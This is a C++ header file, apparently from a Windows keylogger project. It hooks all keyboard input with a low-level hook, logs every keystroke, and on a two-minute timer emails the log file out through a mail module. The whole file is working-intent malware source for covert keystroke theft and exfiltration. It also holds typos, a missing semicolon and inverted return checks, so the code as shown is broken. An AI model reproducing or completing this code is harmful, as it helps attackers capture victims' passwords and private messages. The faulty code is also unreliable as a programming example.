#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

std::string keylog = "";

void TimerSendMail()
{
     if(keylog.empty())
        return;
     std::string last_file = IO::WriteLog(keylog);

     if(last_file.empty())
     {
         Helper::WriteAppLog("File creation was not successfull. Keylog'" + keylog + "'");
         return;
     }

     int x = Mail::SendMail("Log [" + last_file + "]", "Hi The file is attached" + keylog, IO::GetOurPath(true) + last_file);

     if(x!=7)
        Helper::WriteAppLog("Mail was not sent" + Helper::ToString(x));
     else
        keylof = "";

}

Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite );

HHOOK eHook = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(ncode<0)
        CallNextHookEx(eHook, nCode, wparam, lparam)
    KBDLLHOOKSTRUCT *kbs = (KBDDLLHOOKSTRUCT *)lparam;
    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if(kbs->vkCode == VK_RETURN)
            keylog += "\n";
    }
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if(   key == VK_CONTROL
           || key == VK_LCONTROL
           || key == VK_RCONTROL
           || key == VK_RSHIFT
           || key == VK_LSHIFT
           || key == VK_MENU
           || key == VK_LMENU
           || key == VK_RMENU
           || key == VK_CAPITAL
           || key == VK_NUMLOCK
           || key == VK_LWIN
           || key == VK_RWIN
           )
        {
            std::stringbuf keyName = Keys::KEYS[kbs->vkCode].Name;
            keyName.insert(1,"/");
            keylog += keyName;
        }
    }

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook()
{
    Helper::WriteAppLog("Hook Stared...Timer Started");
    MailTimer.Start(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);

    return eHook == NULL;
}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)b;
}

bool IsHooked()
{
    return (bool)(eHook == NULL);
}

#endif // KEYBHOOK_H
